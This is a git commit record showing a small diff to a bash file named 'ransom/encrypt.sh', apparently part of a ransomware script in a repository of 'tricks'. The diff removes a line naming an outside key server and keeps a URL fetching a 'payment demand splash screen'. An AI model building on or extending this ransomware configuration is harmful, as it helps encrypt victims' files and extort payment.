306e6adbbc28063d06927dad6624731f7f5cb705
absane <jsibley1@gmail.com>
2017-05-31 17:47:26 -0400

    Update encrypt.sh

--- ransom/encrypt.sh
+++ ransom/encrypt.sh
@@ -1,8 +1,5 @@
 #!/bin/bash
 
-# Server where unique key is created
-keyServer="https://secure.www-ssl.co"
-
 # Payment demand splash screen
 splashLocation="https://raw.githubusercontent.com/absane/Tricks/master/ransom/ransomware_splash.html"
 
